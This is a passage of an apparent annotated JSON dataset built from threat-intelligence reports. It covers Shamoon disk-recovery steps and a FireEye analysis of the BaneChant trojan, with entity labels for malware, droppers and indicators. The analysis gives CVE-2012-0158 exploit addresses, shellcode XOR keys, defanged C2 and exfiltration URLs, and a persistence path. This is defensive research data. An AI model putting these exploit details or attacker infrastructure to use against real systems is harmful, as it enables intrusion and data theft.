"Truncated", "for", "size", "\u2026]"], ["00", "00", "55", "AA"], ["EB", "52", "90", "\u2013", "Instruction", "to", "jump", "to", "boot", "code", "(Not", "necessary", "for", "our", "application)"], ["4E", "54", "46", "53", "20", "20", "20", "20", "\u2013", "OEM", "Name", "(NTFS"], [")"], ["00", "02", "\u2013", "Bytes", "per", "sector", ",", "0x0200", "=", "512", "Bytes", "."], ["08", "\u2013", "Sectors", "per", "cluster", "=", "8"], ["F8", "\u2013", "Media", "descriptor", "(Not", "necessary", "for", "our", "application)"], ["C0", "F8", "F8", "0D", "00", "00", "00", "00", "\u2013", "Total", "sectors", "in", "file", "system", ",", "0x00DF8F8C0", "=", "234420416", "Sectors", "(Add", "on", "the"], ["sector", "location", "of", "VBR", "for", "actual", "end", "of", "the", "file", "system", ",", "in", "this", "example", "the", "VBR", "is", "at", "sector", "63", "therefore", "the"], ["total", "sectors", "in", "the", "file", "system", "are", "234420416", "+", "63", "=", "234420479)"], ["00", "00", "0C", "00", "00", "00", "00", "00", "\u2013", "Starting", "cluster", "of", "the", "MFT", ",", "0X000C0000", "=", "786432", "Clusters", ".", "786432", "*", "8", "(Cluster"], ["size)", "+63", "(VBR", "Sector)", "=", "6291519", "Sectors"], ["8C", "8F", "DF", "00", "00", "00", "00", "00", "\u2013", "Starting", "cluster", "of", "the", "MFT", "mirror", ",", "0x00DF8F8C", "=", "14651276", ".", "14651276", "*", "8", "+", "63"], ["=", "117210271", "Sectors"], ["F6", "\u2013", "Size", "of", "MFT", "Entry", ",", "246", "."], ["01", "\u2013", "Index", "size", ",", "1", "."], ["26", "FA", "CA", "70", "02", "CB", "70", "44", "\u2013", "Serial", "number", "."], ["For", "more", "technical", "information", "on", "file", "systems", "and", "their", "forensic", "value", ",", "Brian", "Carrier\u2019s", "book", "File", "System"], ["Forensic", "Analysis", "is", "an", "invaluable", "tool", "."], ["Fig", "2", ".", "Example", "of", "a", "broken", "down", "BPB", "found", "within", "the", "boot", "sector", "."], ["Just", "because", "the", "boot", "sector", "of", "the", "VBR", "is", "recoverable", "doesn\u2019t", "mean", "that", "everything", "on", "the", "file"], ["system", "will", "be", "restored", "to", "normal", ".", "If", "a", "file", "was", "wiped", "by", "the", "malware", "then", "it", "will", "still", "be", "wiped", ",", "or"], ["partially", "wiped", ".", "However", "files", "that", "weren\u2019t", "wiped", "will", "be", "much", "easier", "and", "faster", "to", "recover", "then"], ["carving", "and", "the", "context", "of", "each", "file", "will", "be", "easy", "to", "interpret", "."], ["To", "recover", "or", "identify", "the", "backup", "VBR", "a", "search", "will", "need", "to", "be", "run", "across", "the", "image", "file", ".", "It", "is"], ["preferable", "if", "the", "image", "file", "is", "a", "raw", "image", "as", "they", "are", "easier", "to", "edit", "then", "other", "image", "file", "formats", "."], ["The", "search", "was", "performed", "for", "the", "hex", "of", "the", "VBR", "file", "header", ",", "EB", "52", "90", "4E", "54", "46", "53", "(\u00ebR", "NTFS)", "."], ["A", "few", "hits", "were", "found", "throughout", "the", "drive", ",", "and", "it", "appeared", "that", "there", "were", "multiple", "empty", "VBR"], ["templates", "throughout", "the", "system", "(Shown", "in", "Figure", "3)", ".", "The", "correct", "VBR", "will", "likely", "be", "the", "one", "with"], ["information", "filled", "in", "from", "offset", "10", "\u2013", "80", "(See", "Figure", "2", "to", "breakdown)", ".", "During", "testing", "it", "was", "found"], ["that", "the", "last", "hit", "was", "normally", "the", "correct", "VBR", ",", "as", "this", "would", "be", "the", "VBR", "found", "at", "the", "end", "of", "the"], ["volume", "."], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "5", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["Fig", "3", ".", "Example", "of", "a", "blank", "VBR", "."], ["Note:", "On", "2003", "systems", "the", "boot", "backup", "is", "sometimes", "found", "halfway", "through", "the", "partition", ",", "a"], ["manual", "parsing", "of", "the", "file", "will", "need", "to", "be", "performed", "to", "confirm", "the", "VBR", "is", "legitimate", "for", "the"], ["partition", "."], ["Once", "the", "VBR", "was", "found", "we", "noted", "the", "offset", "and", "calculated", "the", "sector", "to", "locate", "the", "backup", "in"], ["our", "desired", "forensic", "program", ".", "For", "the", "purposes", "of", "testing", "we", "used", "EnCase", "(v6", ".", "19.6).", "Once", "the"], ["sector", "of", "the", "backup", "VBR", "is", "known", ",", "EnCase", "was", "started", "and", "the", "image", "of", "the", "infected", "system"], ["was", "loaded", ".", "Within", "disk", "view", "we", "located", "the", "backup", "VBR", "and", "right", "clicked", "to", "add", "a", "manual"], ["partition", "as", "an", "NTFS", "file", "system", ".", "The", "partition", "was", "added", ",", "the", "MFT", "read", ",", "and", "the", "file", "system"], ["appeared:"], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "6", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["Fig", "4", ".", "File", "system", "recovered", "within", "EnCase", "."], ["With", "the", "file", "system", "restored", "some", "relevant", "artifacts", "can", "be", "located", "now", ",", "and", "an", "actual", "computer"], ["forensic", "examination", "can", "take", "place", "."], ["This", "recovery", "can", "be", "successful", "without", "the", "use", "of", "the", "EnCase", "suite", "of", "forensic", "software", "as", "well", "."], ["Using", "a", "hex", "editor", "of", "your", "choice", "to", "repair", "the", "image", ",", "in", "our", "testing", "WinHex", "(16", ".", "6)", "was", "used", ".", "Find"], ["the", "file", "header", "of", "the", "backup", "VBR", "within", "a", "file", "editor", ",", "copy", "from", "the", "header", "to", "footer", "of", "the", "boot"], ["sector;", "the", "footer", "will", "always", "be", "55", "AA", ".", "The", "size", "will", "be", "512", "bytes", "from", "header", "to", "footer", ".", "Then"], ["depending", "on", "what", "operating", "system", "is", "being", "examined", "you", "can", "write", "the", "copied", "boot", "sector", "to"], ["the", "appropriate", "sector", "on", "the", "affected", "image", "."], ["Placing", "the", "boot", "sector", "into", "the", "correct", "location", "will", "be", "the", "trickiest", "part", "as", "incorrect", "placement", "will"], ["result", "in", "the", "file", "system", "not", "being", "recognized", ".", "The", "boot", "sector", "should", "be", "placed", "at", "sector", "63/56"], ["for", "XP/2003", ",", "and", "at", "sector", "2048/206848", "for", "Windows", "7", ".", "After", "this", "is", "complete", "you", "will", "be", "able", "to"], ["add", "the", "image", "into", "the", "forensic", "program", ".", "If", "the", "file", "system", "is", "not", "recognized", "then", "it", "is", "possible", "that"], ["the", "MBR", "will", "need", "to", "be", "reconstructed", ",", "though", "this", "is", "unlikely", ".", "Before", "rebuilding", "the", "MBR", "try"], ["adding", "the", "image", "as", "a", "volume", "and", "not", "as", "a", "disk", "."], ["Note:", "Other", "recovery", "techniques", "are", "certainly", "viable", "as", "well", ".", "There", "are", "automated", "partition"], ["rebuilding", "tools", "available", ",", "though", "some", "of", "these", "rely", "on", "a", "valid", "MBR", "to", "work", "properly", "(In", "this", "case"], ["that", "wouldn\u2019t", "be", "feasible)", ".", "Other", "options", "would", "be", "the", "fixboot", "command", "from", "the", "Windows"], ["Recovery", "Console", "found", "on", "a", "Windows", "OS", "disk", ".", "What", "we", "have", "presented", "here", "are", "forensically"], ["sound", "methods", "that", "are", "easily", "repeatable", "and", "least", "damaging", "to", "the", "evidence/image", "."], ["Multiple", "Partition", "Recovery", "Strategies"], ["For", "testing", "purposes", "the", "system", "with", "Windows", "2003", "was", "set", "up", "with", "three", "different", "partitions", ".", "We"], ["wanted", "to", "emulate", "the", "situation", "in", "which", "one", "would", "have", "multiple", "partitions", "on", "the", "computers", ",", "as"], ["is", "quite", "common", ".", "Conceivably", "the", "malware", "should", "wipe", "all", "of", "these", "partitions", "as", "well", ",", "as", "has"], ["been", "seen", "within", "the", "code", "of", "the", "malware", ".", "What", "we", "wanted", "to", "look", "at", "was", "the", "extent", "of", "the"], ["wiping", "on", "the", "partitions", "and", "whether", "the", "same", "techniques", "that", "were", "applied", "to", "a", "single", "partitioned"], ["drive", "would", "still", "apply", "on", "the", "multiple", "partitioned", "drive", "."], ["In", "theory", "each", "partition", "should", "be", "recoverable", ",", "as", "non-bootable", "partitions", "still", "create", "a", "VBR", "and"], ["place", "the", "backup", "at", "the", "end", "of", "the", "partition", "when", "a", "NTFS", "file", "system", "is", "installed", ".", "After", "searching"], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "7", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["through", "the", "drive", "we", "found", "that", "there", "were", "three", "VBRs", "that", "all", "seemed", "to", "have", "corresponding"], ["information", "for", "the", "partitions", "that", "were", "originally", "created", ".", "On", "our", "test", "system", "we", "found", "that"], ["EnCase", "was", "not", "adding", "the", "partitions", "in", "a", "way", "that", "would", "recognize", "the", "file", "system", "as", "it", "did", "for"], ["the", "other", "systems", ".", "This", "could", "be", "because", "our", "boot", "sector", "was", "at", "sector", "56", "and", "not", "63", ",", "or"], ["because", "the", "multiple", "partitions", "clash", "when", "trying", "to", "add", "them", "in", "."], ["We", "ended", "up", "having", "to", "edit", "the", "image", "by", "adding", "the", "backup", "boot", "sectors", "into", "the", "correct", "sector"], ["where", "the", "originals", "were", "found", "."], ["Partition"], ["Boot", "Sector", "Placed", "At"], ["Backup", "Boot", "Sector"], ["1", "(Primary)"], ["56"], ["41926079"], ["2"], ["41926080"], ["62417879"], ["3"], ["62417880"], ["82909679"], ["Fig", "5", ".", "VBR", "Placement", "in", "Windows", "2003"], ["Note:", "The", "VBR", "placement", "for", "the", "next", "partition", "starts", "after", "the", "backup", "VBR", "of", "the", "preceding"], ["partition", "."], ["Once", "the", "VBRs", "were", "added", "correctly", "we", "proceeded", "to", "add", "the", "partitions", "into", "EnCase", "."], ["Fig", "6", ".", "Reconstructed", "file", "system", "of", "a", "Windows", "2003", "operating", "system", "wiped", "by", "Shamoon", "."], ["Note:", "EnCase", "gives", "default", "volume", "labels", "when", "added", ",", "so", "C", ",", "D", ",", "and", "E", "are", "respectively", "1", ",", "2", ",", "and"], ["3", "."], ["The", "extent", "of", "the", "wiping", "appeared", "to", "be", "on", "the", "same", "level", "to", "what", "was", "found", "on", "single"], ["partitioned", "drives", ".", "As", "mentioned", "before", "this", "was", "to", "be", "expected", "as", "the", "malware", "tries", "to", "wipe"], ["mounted", "and", "other", "volumes", "first", "and", "will", "then", "move", "to", "the", "primary", "volume", "(1/C)", "."], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "8", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["The", "Fidelis", "Take"], ["Fidelis", "researchers", "have", "developed", "a", "set", "of", "rules", "for", "detecting", "the", "Shamoon", "malware", "along", "the"], ["entire", "threat", "life", "cycle:", "initial", "infection", ",", "lateral", "propagation", ",", "and", "command", "and", "control"], ["communication", ".", "The", "embedded", "malware", "detection", "engine", "also", "recognizes", "the", "variant", "of"], ["Shamoon", "malware", "analyzed", ".", "All", "sensor", "configurations", "are", "capable", "of", "detecting", "the", "initial", "infection"], ["and", "the", "command", "and", "control", "communication", ",", "and", "the", "Fidelis", "XPS", "Internal", "Sensor", "is", "required", "for"], ["detecting", "the", "lateral", "movement", "of", "the", "malicious", "program", "."], ["Further", "Reading"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["Shamoon", "the", "Wiper", "Copycats", "at", "Work", "(2012)", ",", "retrieved", "26", "Oct", "2012", "from"], ["http://www", ".", "securelist.com/en/blog/208193786/Shamoon_the_Wiper_Copycats_at_Work"], ["Shamoon", "the", "Wiper", "in", "details", ",", "Tarakanov", "", ",", "Dmitry", "(2012)", ",", "retrieved", "26", "Oct", "2012", "from"], ["http://www", ".", "securelist.com/en/blog/208193795/Shamoon_the_Wiper_in_details"], ["Shamoon", "the", "Wiper", "in", "details", "II", ",", "Tarakanov", "", ",", "Dmitry", "(2012)", ",", "retrieved", "26", "Oct", "2012", "from"], ["http://www", ".", "securelist.com/en/blog/208193834/Shamoon_The_Wiper_further_details_Part_II"], ["Shamoon", ",", "a", "two-staged", "targeted", "attack", "(2012)", ",", "retrieved", "26", "Oct", "2012", "from"], ["http://blog", ".", "seculert.com/2012/08/shamoon-two-stage-targeted-attack.html"], ["\u2018Shamoon\u2019", "Virus", "Most", "Destructive", "Ever", "To", "Hit", "A", "Business", ",", "Leon", "Panetta", "Warns", "(2012)", ","], ["retrieved", "from", "http://www", ".", "huffingtonpost.com/2012/10/11/shamoon-virus-leonpanetta_n_1960113.html"], ["Carrier", ",", "Brian", "(2005)", ".", "File", "System", "Forensic", "Analysis", ".", "Upper", "Saddle", "River", ",", "NJ:", "Pearson"], ["Education", "Inc", "."], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "9", "of", "9"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Country", "name": "India", "sent_id": null, "pos": []}, {"old_id": "T2", "type": "ExploitTargetObject", "name": "Offices of the Dalai Lama", "sent_id": null, "pos": []}, {"old_id": "T3", "type": "ExploitTargetObject", "name": "United Nations", "sent_id": null, "pos": []}, {"old_id": "T4", "type": "Location", "name": "Chengdu", "sent_id": null, "pos": []}], "labels": [], "title": ["inputs/shadows-in-the-cloud"], "sents": [["T1", "Country", "8024", "8029", "India"], ["T2", "ExploitTargetObject", "8035", "8060", "Offices", "of", "the", "Dalai", "Lama"], ["T3", "ExploitTargetObject", "8066", "8080", "United", "Nations"], ["T4", "Location", "9032", "9039", "Chengdu"]]}], [{"vertexSet": [{"old_id": "T1", "type": "TrojanHorse", "name": "TrojanAPTBaneChant", "sent_id": 0, "pos": []}, {"old_id": "T2", "type": "Dropper", "name": "Islamic Jihaddoc", "sent_id": 6, "pos": []}, {"old_id": "T3", "type": "ExploitTargetObject", "name": "governments of Middle East and Central Asia", "sent_id": 7, "pos": []}, {"old_id": "T4", "type": "Payload", "name": "MSCOMCTLocx", "sent_id": 40, "pos": []}, {"old_id": "T5", "type": "Vulnerability", "name": "CVE 2012-0158", "sent_id": 41, "pos": [0, 1]}, {"old_id": "T6", "type": "Indicator", "name": "moo", "sent_id": 46, "pos": []}, {"old_id": "T7", "type": "Indicator", "name": "hxxp://symbisecurecom/update/winwordpkg", "sent_id": 54, "pos": []}, {"old_id": "T8", "type": "Dropper", "name": "winwordpkg", "sent_id": 67, "pos": []}, {"old_id": "T9", "type": "Payload", "name": "hxxp://kibberno-iporg/adserv/logojpg", "sent_id": 80, "pos": []}, {"old_id": "T10", "type": "Software", "name": "Mozilla/40", "sent_id": 81, "pos": []}, {"old_id": "T11", "type": "Software", "name": "MSIE 60", "sent_id": 81, "pos": []}, {"old_id": "T12", "type": "Software", "name": "Windows NT 51", "sent_id": 81, "pos": []}, {"old_id": "T13", "type": "File", "name": "C:\\ProgramData\\Google2\\GoogleUpdateexe", "sent_id": 86, "pos": []}, {"old_id": "T14", "type": "File", "name": "GoogleUpdateexe", "sent_id": 88, "pos": []}, {"old_id": "T15", "type": "Indicator", "name": "hxxp://symbisecurecom/adserv/getphp", "sent_id": 94, "pos": []}, {"old_id": "T16", "type": "Obfuscation", "name": "Base-64", "sent_id": 94, "pos": [8]}, {"old_id": "T17", "type": "Indicator", "name": "BaneChant", "sent_id": 95, "pos": []}, {"old_id": "T18", "type": "TrojanHorse", "name": "TrojanAPTBaneChant", "sent_id": 97, "pos": []}, {"old_id": "T19", "type": "Payload", "name": "GoogleUpdateexe", "sent_id": 105, "pos": []}, {"old_id": "T20", "type": "Payload", "name": "GoogleUpdateexe", "sent_id": 107, "pos": []}], "labels": [{"old_id": "R1", "r": "P13", "h": 17, "t": 19, "evidence": [97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107]}, {"old_id": "R2", "r": "P13", "h": 17, "t": 18, "evidence": [97, 98, 99, 100, 101, 102, 103, 104, 105]}, {"old_id": "R3", "r": "P21", "h": 16, "t": 17, "evidence": [95, 96, 97]}, {"old_id": "R4", "r": "P21", "h": 14, "t": 17, "evidence": [94, 95, 96, 97]}, {"old_id": "R5", "r": "P13", "h": 17, "t": 15, "evidence": []}, {"old_id": "R6", "r": "P21", "h": 13, "t": 17, "evidence": [88, 89, 90, 91, 92, 93, 94, 95, 96, 97]}, {"old_id": "R7", "r": "P21", "h": 12, "t": 17, "evidence": [86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97]}, {"old_id": "R8", "r": "P13", "h": 17, "t": 8, "evidence": []}, {"old_id": "R9", "r": "P13", "h": 7, "t": 8, "evidence": [67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80]}, {"old_id": "R10", "r": "P13", "h": 1, "t": 3, "evidence": [6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40]}, {"old_id": "R11", "r": "P21", "h": 5, "t": 0, "evidence": []}, {"old_id": "R12", "r": "P21", "h": 6, "t": 0, "evidence": []}], "title": ["inputs/txt/201304FireEyeTrojanAPTBaneChant"], "sents": [["Trojan", ".", "APT.BaneChant:", "In-Memory", "Trojan", "That", "Observes", "for"], ["Multiple", "Mouse", "Clicks"], ["Summary"], ["Last", "December", ",", "our", "senior", "malware", "researcher", "(Mr", ".", "Abhishek", "Singh)", "posted", "an", "article", "about", "a", "Trojan"], ["which", "could", "detect", "mouse", "clicks", "to", "evade", "sandbox", "analysis", ".", "Interestingly", ",", "we", "have", "found", "another", "spear"], ["phishing", "document", "that", "downloads", "malware", "which", "incorporates", "improved", "mouse", "click", "detection", "antisandboxing", "capability", ".", "It", "also", "leverages", "multiple", "advanced", "evasion", "techniques", "to", "achieve", "stealth", "and"], ["persistent", "infection", ".", "The", "name", "of", "malicious", "document", "is", "translated", "to", "be", "\u201cIslamic", "Jihad", ".", "doc\u201d.", "Hence", ",", "we"], ["suspect", "that", "this", "weaponized", "document", "was", "used", "to", "target", "the", "governments", "of", "Middle", "East", "and", "Central"], ["Asia", "."], ["This", "new", "malware", "is", "significant", "for", "several", "reasons:"], ["It", "detects", "multiple", "mouse", "clicks:", "In", "the", "past", ",", "evasion", "methods", "using", "mouse", "clicks", "only", "detected"], ["a", "single", "click", ",", "making", "the", "malware", "fairly", "easy", "to", "overcome", "."], ["The", "callback", "goes", "to", "a", "legitimate", "URL:", "Often", "when", "malware", "performs", "its", "callback", ",", "the"], ["communication", "goes", "directly", "to", "the", "CnC", "server", ".", "In", "this", "case", ",", "the", "callback", "goes", "to", "a", "legitimate", "URL"], ["shortening", "service", ",", "which", "would", "then", "redirect", "the", "communication", "to", "the", "CnC", "server", ".", "Automated"], ["blocking", "technologies", "are", "likely", "to", "block", "only", "the", "URL", "shortening", "service", "and", "not", "the", "CnC", "server", "."], ["It", "has", "anti-forensic", "capability:", "This", "malware", "doesn\u2019t", "kick", "into", "high", "gear", "immediately", ".", "Instead", "it"], ["requires", "an", "Internet", "connection", "for", "malicious", "code", "to", "be", "downloaded", "to", "the", "memory", "and"], ["executed", ".", "Unlike", "predecessors", "that", "are", "very", "obvious", "and", "immediately", "get", "to", "work", ",", "this", "malware", "is"], ["merely", "a", "husk", "and", "its", "true", "malicious", "intent", "could", "only", "be", "found", "in", "the", "downloaded", "code", ".", "This"], ["prevents", "forensic", "investigators", "from", "extracting", "the", "\u201ctrue\u201d", "malicious", "code", "from", "the", "disk", "."], ["Overall", ",", "this", "malware", "was", "observed", "to", "send", "information", "about", "the", "computer", "and", "set", "up", "a", "backdoor", "for"], ["remote", "access", ".", "This", "backdoor", "provides", "the", "attacker", "the", "flexibility", "on", "how", "malicious", "activities", "could", "be"], ["executed", "."], ["Technical", "Analysis:", "How", "Does", "it", "Work", "?"], ["After", "opening", "this", "malicious", "document", ",", "it", "attempts", "to", "download", "an", "XOR", "encoded", "binary", "(using", "a", "two", "byte"], ["XOR", "key)", "for", "the", "stage", "one", "payload", ".", "It", "was", "also", "observed", "that", "the", "attacker", "leveraged", "a", "shortened", "URL", "to"], ["\u201chide\u201d", "malicious", "domains", "from", "automated", "analysis", "technologies", ".", "After", "investigation", ",", "the", "malicious"], ["domain", "was", "analyzed", "to", "be", "recently", "registered", ".", "See", "Figure", "1", "for", "the", "first", "stage", "download", "scenario", "."], ["Figure", "1", "Stage", "One", "Download"], ["The", "attacker", "has", "designed", "the", "stage", "one", "malware", "to", "be", "merely", "a", "husk", ".", "Having", "the", "decrypted", "executable", "file"], ["alone", "would", "not", "be", "useful", "in", "understanding", "its", "intent", ".", "It", "is", "because", "a", "majority", "of", "the", "malicious", "code", "is", "only"], ["available", "after", "downloading", "the", "second", "stage", "payload", ".", "The", "second", "stage", "payload", "was", "available", "as", "a", "fake"], ["\u201cJPEG\u201d", "file", "from", "the", "malicious", "server", ".", "By", "designing", "the", "malware", "this", "way", ",", "it", "makes", "it", "harder", "to", "perform"], ["incidence", "response", "and", "facilitates", "ease", "of", "update", "of", "malicious", "code", ".", "Again", ",", "in", "this", "second", "stage", "download", ","], ["the", "malicious", "domain", "was", "not", "found", "in", "the", "malware", ".", "It", "made", "use", "of", "the", "dynamic", "DNS", "service", "provided", "by"], ["\u201cNO-IP\u201d", "to", "indirectly", "access", "the", "malicious", "domain", ".", "See", "Figure", "2", "for", "the", "second", "stage", "download", "scenario", "."], ["The", "technical", "details", "of", "each", "component", "(shellcode", "and", "payload)", "will", "be", "further", "elaborated", "."], ["Figure", "2", "Stage", "Two", "Download"], ["Shellcode", "Analysis"], ["The", "spear", "phishing", "document", "was", "in", "RTF", "format", "which", "as", "designed", "loads", "MSCOMCTL", ".", "ocx", "and", "exploits"], ["CVE", "2012-0158", ".", "By", "executing", "return", "at", "0x27606EFF", ",", "it", "will", "load", "EIP", "with", "address", "0x27583C30", "which", "is"], ["translated", "to", "be", "JMP", "ESP", "to", "execute", "shellcode", "in", "the", "stack", ".", "See", "the", "figure", "below", "."], ["Figure", "3", "Stack", "Corruption", "To", "\u201cJMP", "ESP\u201d"], ["Like", "most", "modern", "shellcode", ",", "its", "stub", "decrypts", "its", "body", "using", "a", "simple", "XOR", "key", "(see", "Figure", "4)", ".", "By", "stepping"], ["through", "the", "shellcode", ",", "it", "attempts", "to", "download", "hxxp://ow", ".", "ly/iGKKT", "and", "saves", "it", "to", "the", "temp", "directory"], ["with", "a", "file", "name", "prefixed", "with", "\u201cmoo\u201d", ",", "e", ".", "g.,", "\u201cmoo1", ".", "tmp\u201d", "(see", "Figure", "5)", ".", "It", "is", "important", "to", "note", "that", "\u201cow", ".", "ly\u201d", "is"], ["not", "a", "malicious", "domain", ".", "Instead", ",", "it", "is", "a", "URL", "shortening", "server", ".", "It", "is", "believed", "that", "the", "rational", "for", "such"], ["indirect", "access", "is", "to", "defeat", "automated", "URL", "blacklisting", ".", "Figure", "6", "depicts", "how", "a", "malicious", "URL", "could", "be"], ["shortened", "using", "this", "service", "."], ["Figure", "4", "Single", "Byte", "XOR", "Key", "0xF1"], ["Figure", "5", "URLDownloadToFileA"], ["Figure", "6", "URL", "Shortening", "Service"], ["From", "the", "network", "traffic", ",", "it", "is", "obvious", "that", "the", "real", "malicious", "content", "is", "located", "at"], ["hxxp://symbisecure", ".", "com/update/winword.pkg", "(see", "Figure", "7)", ".", "As", "an", "excecutable", "file", "usually", "contains"], ["many", "zeros", "in", "series", ",", "the", "zeros", "would", "become", "the", "XOR", "key", "when", "XOR", "encoded", ".", "For", "example", ",", "0xAA", "xor"], ["0\u00d700", "equals", "to", "0xAA", ".", "By", "examining", "the", "content", "using", "a", "hex", "editor", ",", "it", "is", "obvious", "that", "there", "are", "many", "\u201c9E"], ["44\u201d", "repeated", ".", "Hence", ",", "by", "trying", "0x449E", "(little", "endian)", "as", "an", "XOR", "key", ",", "it", "would", "reveal", "that", "it", "is", "a", "PE", "file", ".", "At"], ["offset", "zero", ",", "it", "is", "decrypted", "to", "be", "\u201cMZ\u201d;", "at", "offset", "0x3C", ",", "it", "is", "decrypted", "to", "be", "0x00000E0;", "and", "at"], ["0x000000E0", ",", "it", "is", "decrypted", "to", "be", "PE", "(see", "Figure", "8)", "."], ["By", "generalizing", "this", "idea", ",", "the", "single", "or", "double", "byte", "XOR", "key", "can", "be", "seen", "as", "a", "dword", "XOR", "key", "as", "it", "repeats"], ["over", "itself", ".", "For", "example", ",", "0x449E", "XOR", "key", "could", "be", "seen", "as", "0x449E449E", ".", "By", "counting", "the", "DWORD", "with"], ["the", "highest", "occurance", ",", "it", "could", "be", "a", "probable", "XOR", "key", "if", "the", "file", "is", "XOR", "encrypted", ".", "This", "should", "work", "for"], ["samples", "that", "are", "(1", ",", "2", "or", "4", ",", "but", "not", "3", "bytes)", "XOR", "encrypted", "."], ["Figure", "7", "Stage", "1", "Download", "Content"], ["Figure", "8", "Double", "Byte", "XOR", "Encrypted", "Payload"], ["Payload", "Analysis"], ["Even", "though", "\u201cwinword", ".", "pkg\u201d", "is", "an", "executable", "husk", "to", "host", "malicious", "code", "downloaded", "at", "the", "second", "stage", ","], ["it", "contains", "a", "mouse-click", "check", "to", "detect", "human", "behaviors", ".", "Only", "if", "the", "number", "of", "left", "clicks", "is", "three", "or"], ["more", ",", "will", "the", "malware", "proceed", "further", "to", "download", "the", "second", "stage", "payload", "\u2013", "the", "true", "malicious", "code"], ["(see", "Figure", "9", "and", "Figure", "10)", "."], ["Figure", "9", "Track", "Number", "of", "Left", "Clicks"], ["Figure", "10", "Proceed", "If", "Left", "Click", "Count", "Is", "Three", "Or", "More"], ["After", "the", "malware", "detects", "sufficient", "mouse", "clicks", ",", "it", "proceeds", "to", "decrypt", "its", "malicious", "URL", "to", "download"], ["the", "second", "stage", "payload", "(see", "Figure", "11)", ".", "By", "following", "the", "TCP", "stream", "(see", "Figure", "12)", "and", "examining", "the"], ["header", "of", "the", "downloaded", "JPG", "file", ",", "it", "is", "obvious", "that", "downloaded", "content", "is", "not", "a", "JPEG", "file", ".", "By", "doing", "so", ",", "it"], ["effectively", "downloaded", "an", "executable", "content", "that", "is", "not", "conformed", "to", "PE", "format", "to", "defeat", "network", "binary"], ["extraction", ".", "A", "legitimate", "JPG", "file", "should", "contain", "the", "byte", "sequence", "\u201cFFD8FFE0xxxx4A46494600\u201d", "at"], ["offset", "zero", ",", "where", "\u201c4A464946\u201d", "corresponds", "to", "\u201cJFIF\u201d", ".", "Below", "is", "the", "hardcoded", "URL", "and", "user-agent", "that"], ["is", "used", "by", "this", "malware", "sample", "."], ["URL:", "hxxp://kibber", ".", "no-ip.org/adserv/logo.jpg"], ["User-Agent:", "Mozilla/4", ".", "0", "(compatible;", "MSIE", "6", ".", "0;", "Windows", "NT", "5", ".", "1;", "SV2)"], ["Figure", "11", "Malicious", "Domain", "Decryption"], ["Figure", "12", "Fake", "JPG"], ["After", "the", "JPG", "file", "is", "downloaded", "and", "executed", "directly", "in", "the", "memory", ",", "it", "achieves", "persistency", "by", "creating", "a"], ["shortcut", "link", "file", "at", "the", "start", "up", "folder", ".", "This", "link", "file", "will", "execute", "a", "copy", "of", "itself", "located", "at"], ["\u201cC:\\ProgramData\\Google2\\GoogleUpdate", ".", "exe\u201d", "(see", "Figure", "13)", ".", "It", "would", "look", "legitimate", "to", "users", "as", "it"], ["masquerades", "as", "a", "legitimate", "Google", "Updater", ".", "It", "\u201cwould\u201d", "appear", "normal", "if", "it", "attempts", "to", "access", "the"], ["Internet", ".", "In", "comparison", ",", "the", "real", "\u201cGoogleUpdate", ".", "exe\u201d", "resides", "in", "\u201cprogram", "files\u201d", "instead", "\u201cprogram", "data\u201d"], ["directory", "(see", "Figure", "14)", "."], ["Figure", "13", "Persistency", "Mechanism"], ["Figure", "14", "Genuine", "GoogleUpdate", ".", "exe"], ["The", "downloaded", "\u201cJPG\u201d", "file", "was", "analyzed", "to", "be", "a", "backdoor", "in", "the", "victim\u2019s", "machine", ".", "It", "lists", "the", "running"], ["processes", ",", "IP", "configuration", ",", "and", "directories", "of", "root", "drives", "(C", "to", "H)", "as", "depicted", "in", "Figure", "15", ".", "This"], ["information", "is", "posted", "to", "hxxp://symbisecure", ".", "com/adserv/get.php", "in", "Base-64", "format", ".", "After", "decoding", ",", "it", "is"], ["interesting", "that", "it", "begins", "with", "a", "Tag", "named", "\u201cBaneChant\u201d", ".", "After", "doing", "a", "quick", "search", ",", "it", "seems", "to", "be", "a"], ["sound", "track", "composed", "by", "Hans", "Zimmer", "for", "the", "movie", "\u201cThe", "Dark", "Knight", "Rises\u201d", "(see", "Figure", "16)", ".", "This", "is", "the"], ["reason", "we", "name", "this", "malware", "Trojan", ".", "APT.BaneChant."], ["Figure", "15", "Commands", "Executed"], ["Figure", "16", "Exfiltrated", "Computer", "Information"], ["As", "depicted", "in", "Figure", "17", ",", "the", "malware", "could", "perform", "other", "tasks", "as", "listed", "below", "."], ["1", 